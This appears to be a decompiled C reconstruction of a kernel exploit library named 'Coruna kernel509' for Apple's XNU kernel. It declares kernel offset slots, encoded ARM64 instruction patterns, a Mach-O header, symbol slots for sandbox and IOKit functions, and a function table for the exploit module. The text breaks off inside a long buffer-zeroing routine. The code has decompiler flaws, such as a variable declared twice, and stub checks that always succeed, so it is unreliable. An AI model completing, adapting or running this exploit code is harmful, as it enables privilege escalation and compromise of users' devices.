/*
 * Coruna kernel exploit dylib (kernel509) — hand-reconstructed native C
 *
 * Rebuild: hand-reconstructed — skipped by rebuild_native_source.py
 * Standard: Framework/coruna/docs/NATIVE_SOURCE_STANDARD.md
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <IOKit/IOKitLib.h>
typedef struct { uint64_t q0; uint64_t q1; } coruna_svc_regpack_t;


static inline bool coruna_ldrex_pass(void *addr, size_t size)
{
    (void)addr;
    (void)size;
    return true;
}

static inline bool coruna_ldrexp_clear(void)
{
    return true;
}


typedef void (*coruna_implant_trampoline_fn)(void);

static inline uint64_t coruna_u64_pack(uint32_t hi, uint32_t lo)
{
    return ((uint64_t)hi << 32) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack71(uint64_t hi7, uint8_t lo)
{
    return (hi7 << 8) | (uint64_t)lo;
}

static inline uint64_t coruna_u64_pack14(uint8_t hi, uint64_t lo)
{
    return ((uint64_t)hi << 32) | (uint32_t)lo;
}

static inline uint64_t coruna_cat(uint64_t hi, uint64_t lo)
{
    return (hi << 32) | (uint32_t)lo;
}



/* Kernel module runtime constants (from Mach-O image) */
static uint64_t k_kernel_slot_1001;
static uint64_t k_kernel_slot_1870;
static uint64_t k_kernel_slot_1878;
static uint64_t k_kernel_slot_1880;
static uint64_t k_kernel_slot_1888;
static uint64_t k_kernel_slot_1890;
static uint64_t k_kernel_slot_1898;
static uint64_t k_kernel_slot_18a0;
static uint64_t k_kernel_slot_18a8;
static uint64_t k_kernel_slot_18b0;
static uint64_t k_kernel_slot_18b8;
static uint64_t k_kernel_slot_18c0;
static uint64_t k_kernel_slot_18e0;
static uint64_t k_kernel_slot_18e8;
static uint64_t k_kernel_slot_18f0;
static uint64_t k_kernel_slot_18f8;
static uint64_t k_kernel_slot_1900;
static uint64_t k_kernel_slot_1908;
static uint64_t k_kernel_slot_1910;
static uint64_t k_kernel_slot_1914;
static uint64_t k_kernel_slot_1918;
static uint64_t k_kernel_slot_191c;
static uint64_t k_kernel_slot_1920;
static uint64_t k_kernel_slot_1924;
static uint64_t k_kernel_slot_1928;
static uint64_t k_kernel_slot_192c;
static uint64_t k_kernel_slot_1930;
static uint64_t k_kernel_slot_1934;
static uint64_t k_kernel_slot_1938;
static uint64_t k_kernel_slot_193c;
static uint64_t k_kernel_slot_1940;
static uint64_t k_kernel_slot_1944;
static uint64_t k_kernel_slot_1948;
static uint64_t k_kernel_slot_1958;
static uint64_t k_kernel_slot_1960;
static uint64_t k_kernel_slot_1990;
static uint64_t k_kernel_slot_1998;
static uint64_t k_kernel_slot_19a0;
static uint64_t k_kernel_slot_19a8;
static uint64_t k_kernel_slot_19c8;
static uint64_t k_kernel_slot_19d0;
static uint64_t k_kernel_slot_19d8;
static uint64_t k_kernel_slot_19e0;
static uint64_t k_kernel_slot_19e8;
static uint64_t k_kernel_slot_19f0;
static uint64_t k_kernel_slot_19f8;
static uint64_t k_kernel_slot_1a00;
static uint64_t k_kernel_slot_1a08;
static uint64_t k_kernel_slot_1a10;
static uint64_t k_kernel_slot_1a18;
static uint64_t k_kernel_slot_1d08;
static uint64_t k_kernel_slot_1d10;
static uint64_t k_kernel_slot_1d18;
static uint64_t k_kernel_slot_1d20;
static uint64_t k_kernel_slot_1d28;
static uint64_t k_kernel_slot_1d30;
static uint64_t k_kernel_slot_1d38;
static uint64_t k_kernel_slot_1d48;
static uint64_t k_kernel_slot_1d50;
static uint64_t k_kernel_slot_1d58;
static uint64_t k_kernel_slot_2240;
static uint64_t k_kernel_slot_2710;
static uint64_t k_kernel_slot_2c20;
static uint64_t k_kernel_slot_3448;
static uint64_t k_kernel_slot_3450;
static uint64_t k_kernel_slot_3458;
static uint64_t k_kernel_slot_3460;
static uint64_t k_kernel_slot_3468;
static uint64_t k_kernel_slot_3488;
static uint64_t k_kernel_slot_3490;
static uint64_t k_kernel_slot_34f0;
static uint64_t k_kernel_slot_3500;
static uint64_t k_kernel_slot_3508;
static uint64_t k_kernel_slot_3518;
static uint64_t k_kernel_slot_3630;
static uint64_t k_kernel_slot_3638;
static uint64_t k_kernel_slot_363c;
static uint64_t k_kernel_slot_3640;
static uint64_t k_kernel_slot_3644;
static uint64_t k_kernel_slot_3a98;
static uint64_t k_kernel_slot_3e08;
static uint64_t k_kernel_slot_3ec8;
static uint64_t k_kernel_slot_3ed0;
static uint64_t k_kernel_slot_3ed8;
static uint64_t k_kernel_slot_3f40;
static uint64_t k_kernel_slot_3f48;
static uint64_t k_kernel_slot_3f50;
static uint64_t k_kernel_slot_3f58;
static uint64_t k_kernel_slot_3f60;
static uint64_t k_kernel_slot_3fa0;
static uint64_t k_kernel_slot_3fa8;
static uint64_t k_kernel_slot_4001;
static uint64_t k_kernel_ctx_field_u64;
static uint64_t k_kernel_slot_4648;
static uint64_t k_kernel_slot_6648;
static uint64_t k_kernel_rodata_word_41968 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_41970 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_41978 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_42ef0 = 0x412e848000000000ULL;
static uint64_t k_kernel_rodata_word_42ef8 = 0x0000000100000064ULL;
static uint64_t k_kernel_rodata_word_42f00 = 0x0000000000000064ULL;
static uint64_t k_kernel_rodata_word_42f48 = 0x0000000fffffffffULL;
static uint64_t k_kernel_rodata_word_42f50 = 0x0000000000000024ULL;
static uint64_t k_kernel_rodata_word_42f58 = 0x00007ff000000000ULL;
static uint64_t k_kernel_rodata_word_42f60 = 0x0000000000000001ULL;
static uint64_t k_kernel_rodata_word_42f68 = 0x0000000000000002ULL;
static uint64_t k_kernel_rodata_word_42f70 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_42fe8 = 0x0000010000000800ULL;
static uint64_t k_kernel_rodata_word_42ff0 = 0x0000002c80001514ULL;
static uint64_t k_kernel_rodata_word_42ff8 = 0x0000002c80000014ULL;
static uint64_t k_kernel_rodata_word_43010 = 0xf9000010dac10230ULL;
static uint64_t k_kernel_rodata_word_43018 = 0xf9000010dac10a30ULL;
static uint64_t k_kernel_rodata_word_43020 = 0xd538d083d5034fdfULL;
static uint64_t k_kernel_rodata_word_43028 = 0x0000001100000000ULL;
static uint64_t k_kernel_rodata_word_43030 = 0x0000023c00000012ULL;
static uint32_t k_kernel_rodata_word_43080 = 0xd280000f;
static uint32_t k_kernel_rodata_word_43094 = 0xfffffc1f;
static uint32_t k_kernel_rodata_word_430c8 = 0xd73f0911;
static uint32_t k_kernel_rodata_word_430dc = 0xffffffff;
static uint64_t k_kernel_rodata_word_43350 = 0x8b00000052800008ULL;
static uint64_t k_kernel_rodata_word_43358 = 0xffe0fc00ffe0001fULL;
static uint64_t k_kernel_rodata_word_43360 = 0x2900000011000000ULL;
static uint64_t k_kernel_rodata_word_43368 = 0x8b020108f9400008ULL;
static uint64_t k_kernel_rodata_word_43370 = 0xffffffffffc003ffULL;
static uint64_t k_kernel_rodata_word_43378 = 0xd65f03c0f8226801ULL;
static uint64_t k_kernel_rodata_word_43380 = 0xd5033fdfd5033f9fULL;
static uint64_t k_kernel_rodata_word_43388 = 0x00000000d50040bfULL;
static uint64_t k_kernel_rodata_word_43390 = 0xd65f03c000201421ULL;
static uint64_t k_kernel_rodata_word_43398 = 0x00201400a8c17bfdULL;
static uint64_t k_kernel_rodata_word_433a0 = 0x00000000d53800a2ULL;
static uint64_t k_kernel_rodata_word_43450 = 0xea2305c0ea140568ULL;
static uint64_t k_kernel_rodata_word_43458 = 0xd65f03c0f9402400ULL;
static uint64_t k_kernel_rodata_word_43460 = 0xd65f03c0d508831fULL;
static uint64_t k_kernel_rodata_word_43468 = 0xd65f03c0f9000041ULL;
static uint64_t k_kernel_rodata_word_43470 = 0xd65f03c0f9000022ULL;
static uint64_t k_kernel_rodata_word_43478 = 0x52820002aa0003e8ULL;
static uint64_t k_kernel_rodata_word_43480 = 0x17000000b2400000ULL;
static uint64_t k_kernel_rodata_word_43488 = 0x00000000c0000000ULL;
static uint32_t k_kernel_rodata_word_434a0 = 0x78e13108;
static uint64_t k_kernel_rodata_word_434b4 = 0x40000000ffffffffULL;
static uint64_t k_kernel_rodata_word_434e0 = 0x0000000400000001ULL;
static uint64_t k_kernel_rodata_word_434e8 = 0x408f400000000000ULL;
static uint64_t k_kernel_rodata_word_434f0 = 0x408c200000000000ULL;
static uint64_t k_kernel_rodata_word_434f8 = 0x0013000000000000ULL;
static uint64_t k_kernel_rodata_word_43504 = 0x0000000300000004ULL;
static uint64_t k_kernel_rodata_word_43550 = 0x0000000200000014ULL;
static uint64_t k_kernel_rodata_word_43558 = 0x0013000d000b0007ULL;
static uint64_t k_kernel_rodata_word_43770 = 0x0000000200000b36ULL;
static uint64_t k_kernel_rodata_word_43778 = 0x0000007f00000000ULL;
static uint64_t k_kernel_rodata_word_43780 = 0x0000006300000003ULL;
static uint64_t k_kernel_rodata_word_437a0 = 0x70000000020cdefaULL;
static uint64_t k_kernel_rodata_word_437a8 = 0x0000000400000000ULL;
static uint64_t k_kernel_rodata_word_437b0 = 0x0000000100000000ULL;
static uint64_t k_kernel_rodata_word_437d0 = 0x408a980000000000ULL;
static uint64_t k_kernel_rodata_word_446c0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_446e0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_44700 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_48000 = 0x0100000cfeedfacfULL;
static uint64_t k_kernel_rodata_word_48008 = 0x0000000600000000ULL;
static uint64_t k_kernel_rodata_word_48010 = 0x0000079000000015ULL;
static uint64_t k_kernel_rodata_word_48018 = 0x0000000000100085ULL;
static uint64_t k_kernel_rodata_word_48020 = 0x000002c800000019ULL;
static uint64_t k_kernel_rodata_word_48028 = 0x0000545845545f5fULL;
static uint64_t k_kernel_rodata_word_48030 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_48038 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_48048 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_480a0 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_480a8 = 0x0000000080000400ULL;
static uint64_t k_kernel_rodata_word_480d8 = 0x0000000000041948ULL;
static uint64_t k_kernel_rodata_word_480e0 = 0x00000000000001d8ULL;
static uint64_t k_kernel_rodata_word_42e70 = 0x0000000033000000ULL;
static uint64_t k_kernel_rodata_word_42e80 = 0x0000000000284000ULL;
static uint64_t k_kernel_rodata_word_42e90 = 0x0000000000304000ULL;
static uint64_t k_kernel_rodata_word_42ea0 = 0x0000000220000680ULL;
static uint64_t k_kernel_rodata_word_42eb0 = 0x0000000000000040ULL;
static uint64_t k_kernel_rodata_word_42ec0 = 0x0000000200000680ULL;
static uint64_t k_kernel_rodata_word_42ed0 = 0x0000000000000010ULL;
static uint64_t k_kernel_rodata_word_42ee0 = 0x0000000200000680ULL;
static uint64_t k_kernel_rodata_word_43000 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_43040 = 0x0000271000020a51ULL;
static uint64_t k_kernel_rodata_word_43050 = 0x000f4240000003e8ULL;
static uint64_t k_kernel_rodata_word_43070 = 0x00000000d280000fULL;
static uint64_t k_kernel_rodata_word_43084 = 0x00000000ffffffffULL;
static uint64_t k_kernel_rodata_word_43098 = 0x9262f8429ac03021ULL;
static uint64_t k_kernel_rodata_word_430a8 = 0x9ac130a19ac13081ULL;
static uint64_t k_kernel_rodata_word_430b8 = 0xf94046e0f9000e60ULL;
static uint64_t k_kernel_rodata_word_430cc = 0xffffffffffffffffULL;
static uint64_t k_kernel_rodata_word_430e0 = 0xb9400100f9401048ULL;
static uint64_t k_kernel_rodata_word_430f0 = 0xffffffe0ffffffffULL;
static uint64_t k_kernel_rodata_word_43100 = 0xb4000000f9400000ULL;
static uint64_t k_kernel_rodata_word_43110 = 0xff000000ffc00000ULL;
static uint64_t k_kernel_rodata_word_43120 = 0xb868680952800008ULL;
static uint64_t k_kernel_rodata_word_43130 = 0xfffffc1fffe0001fULL;
static uint64_t k_kernel_rodata_word_43140 = 0xb900001ff900001fULL;
static uint64_t k_kernel_rodata_word_43150 = 0xfffffc1ffffffc1fULL;
static uint64_t k_kernel_rodata_word_43160 = 0xb4000000f9000000ULL;
static uint64_t k_kernel_rodata_word_43170 = 0xff00001fffc0001fULL;
static uint64_t k_kernel_rodata_word_43180 = 0xdac10a30f2f9b431ULL;
static uint64_t k_kernel_rodata_word_43190 = 0x0000000000000100ULL;
static uint64_t k_kernel_rodata_word_431a0 = 0x94000000528007c5ULL;
static uint64_t k_kernel_rodata_word_431b0 = 0xfc000000ffffffffULL;
static uint64_t k_kernel_rodata_word_431c0 = 0x58000000d503201fULL;
static uint64_t k_kernel_rodata_word_431d0 = 0xff00001fffffffffULL;
static uint64_t k_kernel_rodata_word_431e0 = 0xd5033f9fd508831fULL;
static uint64_t k_kernel_rodata_word_431f0 = 0x0000000010000000ULL;
static uint64_t k_kernel_rodata_word_43200 = 0x000000009f000000ULL;
static uint64_t k_kernel_rodata_word_43210 = 0xf862782100000000ULL;
static uint64_t k_kernel_rodata_word_43220 = 0xffffffff00000000ULL;
static uint64_t k_kernel_rodata_word_43230 = 0x910003fda9bf7bfdULL;
static uint64_t k_kernel_rodata_word_43240 = 0x00000000a9408388ULL;
static uint64_t k_kernel_rodata_word_43250 = 0x00000000ffffffffULL;
static uint64_t k_kernel_rodata_word_43260 = 0x5800000158000000ULL;
static uint64_t k_kernel_rodata_word_43270 = 0xff00001fff00001fULL;
static uint64_t k_kernel_rodata_word_43280 = 0xfffffff002000000ULL;
static uint64_t k_kernel_rodata_word_43290 = 0xfffffff002008000ULL;
static uint64_t k_kernel_rodata_word_432a0 = 0xfffffff002010000ULL;
static uint64_t k_kernel_rodata_word_432b0 = 0xfffffc1100160000ULL;
static uint64_t k_kernel_rodata_word_432c0 = 0xffffff9100160000ULL;
static uint64_t k_kernel_rodata_word_432d0 = 0x0000000140198099ULL;
static uint64_t k_kernel_rodata_word_432e0 = 0x0000000000000001ULL;
static uint64_t k_kernel_rodata_word_432f0 = 0x0000000000003f40ULL;
static uint64_t k_kernel_rodata_word_43300 = 0x0000000000003e00ULL;
static uint64_t k_kernel_rodata_word_43310 = 0x00000000000003c4ULL;
static uint64_t k_kernel_rodata_word_43320 = 0x00000000000003c5ULL;
static uint64_t k_kernel_rodata_word_43330 = 0xffffffff80000000ULL;
static uint64_t k_kernel_rodata_word_43340 = 0x4000000100000001ULL;
static uint64_t k_kernel_rodata_word_433b0 = 0x2e4a0020baa20010ULL;
static uint64_t k_kernel_rodata_word_433c0 = 0xbe60005056350048ULL;
static uint64_t k_kernel_rodata_word_433d0 = 0x14000000d280060fULL;
static uint64_t k_kernel_rodata_word_433e0 = 0xfc000000ffffffffULL;
static uint64_t k_kernel_rodata_word_433f0 = 0x14000000d28006afULL;
static uint64_t k_kernel_rodata_word_43400 = 0xd50343dfd53b4222ULL;
static uint64_t k_kernel_rodata_word_43410 = 0xdeaddab700010004ULL;
static uint64_t k_kernel_rodata_word_43420 = 0x0000000000004000ULL;
static uint64_t k_kernel_rodata_word_43430 = 0x0000096000000960ULL;
static uint64_t k_kernel_rodata_word_43440 = 0x000f424000002710ULL;
static uint64_t k_kernel_rodata_word_43490 = 0x90000000d34efd08ULL;
static uint64_t k_kernel_rodata_word_434a4 = 0x9f000000ffffffffULL;
static uint64_t k_kernel_rodata_word_43530 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_43540 = 0x0000000403020100ULL;
static uint64_t k_kernel_rodata_word_43760 = 0x0000030000000060ULL;
static uint64_t k_kernel_rodata_word_43790 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_437c0 = 0x000000d300000007ULL;
static uint64_t k_kernel_rodata_word_437e0 = 0xffff000000000000ULL;
static uint64_t k_kernel_rodata_word_437f0 = 0x0000001600000015ULL;
static uint64_t k_kernel_rodata_word_43800 = 0x0000000000000000ULL;
static uint64_t k_kernel_rodata_word_43810 = 0x0000002000000010ULL;
static uint64_t k_kernel_rodata_word_43820 = 0x0000006000000050ULL;
static uint64_t k_kernel_rodata_word_43830 = 0x000000e0000000c0ULL;
static uint64_t k_kernel_rodata_word_43840 = 0x0000019000000170ULL;
static uint64_t k_kernel_rodata_word_43850 = 0x0000040000000300ULL;
static uint64_t k_kernel_rodata_word_43860 = 0x0000080000000680ULL;
static uint64_t k_kernel_rodata_word_4386c = 0x0000200000001800ULL;
static uint64_t k_kernel_rodata_word_400000008;
static void *ptr_kernel509_fn_44730 = (void *)0x00100000000132e4ULL;
static void *k_kernel_ndr_record_slot = (void *)0x8010000000000037ULL;
static void *k_kernel_sandbox_check_no_report_slot = (void *)0x8010000000000038ULL;
static void *k_kernel_nsconcretestackblock_slot = (void *)0x801000000000003aULL;
static void *k_kernel_kernelversionstring_slot = (void *)0x801000000000003bULL;
static void *k_kernel_stack_chk_guard_slot = (void *)0x8010000000000041ULL;
static void *k_kernel_os_alloc_once_table_slot = (void *)0x8010000000000047ULL;
static void *k_kernel_bootstrap_port_slot = (void *)0x8010000000000049ULL;
static void *k_kernel_dyldversionnumber_slot = (void *)0x8010000000000051ULL;
static void *k_kernel_kcfallocatordefault_slot = (void *)0x8010000000000061ULL;
static void *k_kernel_kcfallocatornull_slot = (void *)0x8010000000000062ULL;
static void *k_kernel_kcfbooleanfalse_slot = (void *)0x8010000000000063ULL;
static void *k_kernel_kcftypedictionarykeycallbacks_slot = (void *)0x8010000000000064ULL;
static void *k_kernel_kcftypedictionaryvaluecallbacks_slot = (void *)0x8010000000000065ULL;
static void *k_kernel_kiomasterportdefault_slot = (void *)0x8010000000000066ULL;
static void *k_kernel_mach_task_self_slot = (void *)0x8010000000000079ULL;
static void *k_kernel_vm_page_mask_slot = (void *)0x80100000000000ceULL;
static void *k_kernel_vm_page_shift_slot = (void *)0x80100000000000cfULL;
static void *k_kernel_vm_page_size_slot = (void *)0x80100000000000d0ULL;
void _driver(uint64_t *val)
{
  uint32_t *ptr;
  
  if ((val != (uint64_t *)0x0) && (ptr = _calloc(1,0x50), ptr != (uint32_t *)0x0)) {
    *ptr = 0x20002;
    ((void (**)(void *, long, uint64_t))(ptr + 4))[0] = coruna_ctx_free_613c;
    ((void (**)(void *, long, uint64_t))(ptr + 6))[0] = coruna_kernel509_residual_282;
    ((void (**)(void *, long, uint64_t))(ptr + 8))[0] = coruna_call_mach_thread_self_3087c_78b8;
    ((void (**)(void *, long, uint64_t))(ptr + 10))[0] = coruna_kernel509_residual_283;
    ((void (**)(void *, long, uint64_t))(ptr + 0xc))[0] = coruna_call_mach_thread_self_3087c;
    ((void (**)(void *, long, uint64_t))(ptr + 0xe))[0] = coruna_kernel5_residual_215;
    ((void (**)(void *, long, uint64_t))(ptr + 0x10))[0] = coruna_kernel509_residual_284;
    ((void (**)(void *, long, uint64_t))(ptr + 0x12))[0] = coruna_parse_xnu_processors;
    *val = ptr;
  }
  return;
}
void coruna_ctx_free_613c(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    val[7] = 0;
    val[6] = 0;
    val[9] = 0;
    val[8] = 0;
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[1] = 0;
    *val = 0;
    _free(val);
    return;
  }
  return;
}
void coruna_ctx_free_6140(uint64_t *val)
{
  val[7] = 0;
  val[6] = 0;
  val[9] = 0;
  val[8] = 0;
  val[3] = 0;
  val[2] = 0;
  val[5] = 0;
  val[4] = 0;
  val[1] = 0;
  *val = 0;
  _free(val);
  return;
}
void coruna_kernel509_residual_282(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t scratch;
  
  scratch = 0;
  if (((handle != 0) && (id_2 != (uint64_t *)0x0)) &&
     (err = coruna_kernel509_via_macho_data_const(&scratch), err == 0)) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel509_residual_283(long handle,long addr_2,uint64_t val)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_kernel509_residual_315(addr_2,val);
  }
  return;
}
void coruna_call_mach_thread_self_3087c(long handle,long addr_2)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_mach_thread_self_3087c(addr_2);
  }
  return;
}
void coruna_call_mach_thread_self_3087c_62a4(uint64_t val,uint64_t id_2)
{
  coruna_mach_thread_self_3087c(id_2);
  return;
}
void coruna_call_mach_thread_self_3087c_78b8(long handle,long addr_2)
{
  if ((handle != 0) && (addr_2 != 0)) {
    coruna_pthread_mutex_destroy(addr_2);
  }
  return;
}
void coruna_call_mach_thread_self_3087c_62a4_78cc(uint64_t val,uint64_t id_2)
{
  coruna_pthread_mutex_destroy(id_2);
  return;
}
void coruna_kernel5_residual_215(long handle,long addr_2,int *flags)
{
  if ((((handle != 0) && (addr_2 != 0)) && (flags != (int *)0x0)) &&
     (1 < *(int *)(&k_kernel_slot_1918 + addr_2) + 1U)) {
    *flags = *(int *)(&k_kernel_slot_1918 + addr_2);
    return;
  }
  return;
}
void coruna_kernel509_residual_284(long handle,long *addr_2,uint32_t *size,int flags)
{
  long handle;
  long scratch;
  
  scratch = 0;
  if (((handle != 0) && (addr_2 != (long *)0x0)) &&
     (((size != (uint32_t *)0x0 && (flags != 0)) ||
      ((size == (uint32_t *)0x0 && (flags == 0)))))) {
    handle = *addr_2;
    if (handle == 0) {
      coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x18),handle,0,&scratch);
    }
    if (flags != 0) {
      scratch = handle;
      coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(handle + 0x28),handle,handle,*size,
                   *(uint64_t *)(size + 2));
    }
    *addr_2 = handle;
  }
  return;
}
void coruna_parse_xnu_processors(long handle,size_t *len)
{
  mach_port_t host;
  kern_return_t lk1;
  int err;
  char *ptr;
  size_t scratch;
  uint32_t bootargs;
  int thread_attr [2];
  char host_info [512];
  
  if (handle == 0) {
    return;
  }
  if (len == (size_t *)0x0) {
    return;
  }
  host_info[0x1e8] = '\0';
  host_info[0x1e9] = '\0';
  host_info[0x1ea] = '\0';
  host_info[0x1eb] = '\0';
  host_info[0x1ec] = '\0';
  host_info[0x1ed] = '\0';
  host_info[0x1ee] = '\0';
  host_info[0x1ef] = '\0';
  host_info[0x1e0] = '\0';
  host_info[0x1e1] = '\0';
  host_info[0x1e2] = '\0';
  host_info[0x1e3] = '\0';
  host_info[0x1e4] = '\0';
  host_info[0x1e5] = '\0';
  host_info[0x1e6] = '\0';
  host_info[0x1e7] = '\0';
  host_info[0x1f8] = '\0';
  host_info[0x1f9] = '\0';
  host_info[0x1fa] = '\0';
  host_info[0x1fb] = '\0';
  host_info[0x1fc] = '\0';
  host_info[0x1fd] = '\0';
  host_info[0x1fe] = '\0';
  host_info[0x1ff] = '\0';
  host_info[0x1f0] = '\0';
  host_info[0x1f1] = '\0';
  host_info[0x1f2] = '\0';
  host_info[499] = '\0';
  host_info[500] = '\0';
  host_info[0x1f5] = '\0';
  host_info[0x1f6] = '\0';
  host_info[0x1f7] = '\0';
  host_info[0x1c8] = '\0';
  host_info[0x1c9] = '\0';
  host_info[0x1ca] = '\0';
  host_info[0x1cb] = '\0';
  host_info[0x1cc] = '\0';
  host_info[0x1cd] = '\0';
  host_info[0x1ce] = '\0';
  host_info[0x1cf] = '\0';
  host_info[0x1c0] = '\0';
  host_info[0x1c1] = '\0';
  host_info[0x1c2] = '\0';
  host_info[0x1c3] = '\0';
  host_info[0x1c4] = '\0';
  host_info[0x1c5] = '\0';
  host_info[0x1c6] = '\0';
  host_info[0x1c7] = '\0';
  host_info[0x1d8] = '\0';
  host_info[0x1d9] = '\0';
  host_info[0x1da] = '\0';
  host_info[0x1db] = '\0';
  host_info[0x1dc] = '\0';
  host_info[0x1dd] = '\0';
  host_info[0x1de] = '\0';
  host_info[0x1df] = '\0';
  host_info[0x1d0] = '\0';
  host_info[0x1d1] = '\0';
  host_info[0x1d2] = '\0';
  host_info[0x1d3] = '\0';
  host_info[0x1d4] = '\0';
  host_info[0x1d5] = '\0';
  host_info[0x1d6] = '\0';
  host_info[0x1d7] = '\0';
  host_info[0x1a8] = '\0';
  host_info[0x1a9] = '\0';
  host_info[0x1aa] = '\0';
  host_info[0x1ab] = '\0';
  host_info[0x1ac] = '\0';
  host_info[0x1ad] = '\0';
  host_info[0x1ae] = '\0';
  host_info[0x1af] = '\0';
  host_info[0x1a0] = '\0';
  host_info[0x1a1] = '\0';
  host_info[0x1a2] = '\0';
  host_info[0x1a3] = '\0';
  host_info[0x1a4] = '\0';
  host_info[0x1a5] = '\0';
  host_info[0x1a6] = '\0';
  host_info[0x1a7] = '\0';
  host_info[0x1b8] = '\0';
  host_info[0x1b9] = '\0';
  host_info[0x1ba] = '\0';
  host_info[0x1bb] = '\0';
  host_info[0x1bc] = '\0';
  host_info[0x1bd] = '\0';
  host_info[0x1be] = '\0';
  host_info[0x1bf] = '\0';
  host_info[0x1b0] = '\0';
  host_info[0x1b1] = '\0';
  host_info[0x1b2] = '\0';
  host_info[0x1b3] = '\0';
  host_info[0x1b4] = '\0';
  host_info[0x1b5] = '\0';
  host_info[0x1b6] = '\0';
  host_info[0x1b7] = '\0';
  host_info[0x188] = '\0';
  host_info[0x189] = '\0';
  host_info[0x18a] = '\0';
  host_info[0x18b] = '\0';
  host_info[0x18c] = '\0';
  host_info[0x18d] = '\0';
  host_info[0x18e] = '\0';
  host_info[399] = '\0';
  host_info[0x180] = '\0';
  host_info[0x181] = '\0';
  host_info[0x182] = '\0';
  host_info[0x183] = '\0';
  host_info[0x184] = '\0';
  host_info[0x185] = '\0';
  host_info[0x186] = '\0';
  host_info[0x187] = '\0';
  host_info[0x198] = '\0';
  host_info[0x199] = '\0';
  host_info[0x19a] = '\0';
  host_info[0x19b] = '\0';
  host_info[0x19c] = '\0';
  host_info[0x19d] = '\0';
  host_info[0x19e] = '\0';
  host_info[0x19f] = '\0';
  host_info[400] = '\0';
  host_info[0x191] = '\0';
  host_info[0x192] = '\0';
  host_info[0x193] = '\0';
  host_info[0x194] = '\0';
  host_info[0x195] = '\0';
  host_info[0x196] = '\0';
  host_info[0x197] = '\0';
  host_info[0x168] = '\0';
  host_info[0x169] = '\0';
  host_info[0x16a] = '\0';
  host_info[0x16b] = '\0';
  host_info[0x16c] = '\0';
  host_info[0x16d] = '\0';
  host_info[0x16e] = '\0';
  host_info[0x16f] = '\0';
  host_info[0x160] = '\0';
  host_info[0x161] = '\0';
  host_info[0x162] = '\0';
  host_info[0x163] = '\0';
  host_info[0x164] = '\0';
  host_info[0x165] = '\0';
  host_info[0x166] = '\0';
  host_info[0x167] = '\0';
  host_info[0x178] = '\0';
  host_info[0x179] = '\0';
  host_info[0x17a] = '\0';
  host_info[0x17b] = '\0';
  host_info[0x17c] = '\0';
  host_info[0x17d] = '\0';
  host_info[0x17e] = '\0';
  host_info[0x17f] = '\0';
  host_info[0x170] = '\0';
  host_info[0x171] = '\0';
  host_info[0x172] = '\0';
  host_info[0x173] = '\0';
  host_info[0x174] = '\0';
  host_info[0x175] = '\0';
  host_info[0x176] = '\0';
  host_info[0x177] = '\0';
  host_info[0x148] = '\0';
  host_info[0x149] = '\0';
  host_info[0x14a] = '\0';
  host_info[0x14b] = '\0';
  host_info[0x14c] = '\0';
  host_info[0x14d] = '\0';
  host_info[0x14e] = '\0';
  host_info[0x14f] = '\0';
  host_info[0x140] = '\0';
  host_info[0x141] = '\0';
  host_info[0x142] = '\0';
  host_info[0x143] = '\0';
  host_info[0x144] = '\0';
  host_info[0x145] = '\0';
  host_info[0x146] = '\0';
  host_info[0x147] = '\0';
  host_info[0x158] = '\0';
  host_info[0x159] = '\0';
  host_info[0x15a] = '\0';
  host_info[0x15b] = '\0';
  host_info[0x15c] = '\0';
  host_info[0x15d] = '\0';
  host_info[0x15e] = '\0';
  host_info[0x15f] = '\0';
  host_info[0x150] = '\0';
  host_info[0x151] = '\0';
  host_info[0x152] = '\0';
  host_info[0x153] = '\0';
  host_info[0x154] = '\0';
  host_info[0x155] = '\0';
  host_info[0x156] = '\0';
  host_info[0x157] = '\0';
  host_info[0x128] = '\0';
  host_info[0x129] = '\0';
  host_info[0x12a] = '\0';
  host_info[299] = '\0';
  host_info[300] = '\0';
  host_info[0x12d] = '\0';
  host_info[0x12e] = '\0';
  host_info[0x12f] = '\0';
  host_info[0x120] = '\0';
  host_info[0x121] = '\0';
  host_info[0x122] = '\0';
  host_info[0x123] = '\0';
  host_info[0x124] = '\0';
  host_info[0x125] = '\0';
  host_info[0x126] = '\0';
  host_info[0x127] = '\0';
  host_info[0x138] = '\0';
  host_info[0x139] = '\0';
  host_info[0x13a] = '\0';
  host_info[0x13b] = '\0';
  host_info[0x13c] = '\0';
  host_info[0x13d] = '\0';
  host_info[0x13e] = '\0';
  host_info[0x13f] = '\0';
  host_info[0x130] = '\0';
  host_info[0x131] = '\0';
  host_info[0x132] = '\0';
  host_info[0x133] = '\0';
  host_info[0x134] = '\0';
  host_info[0x135] = '\0';
  host_info[0x136] = '\0';
  host_info[0x137] = '\0';
  host_info[0x108] = '\0';
  host_info[0x109] = '\0';
  host_info[0x10a] = '\0';
  host_info[0x10b] = '\0';
  host_info[0x10c] = '\0';
  host_info[0x10d] = '\0';
  host_info[0x10e] = '\0';
  host_info[0x10f] = '\0';
  host_info[0x100] = '\0';
  host_info[0x101] = '\0';
  host_info[0x102] = '\0';
  host_info[0x103] = '\0';
  host_info[0x104] = '\0';
  host_info[0x105] = '\0';
  host_info[0x106] = '\0';
  host_info[0x107] = '\0';
  host_info[0x118] = '\0';
  host_info[0x119] = '\0';
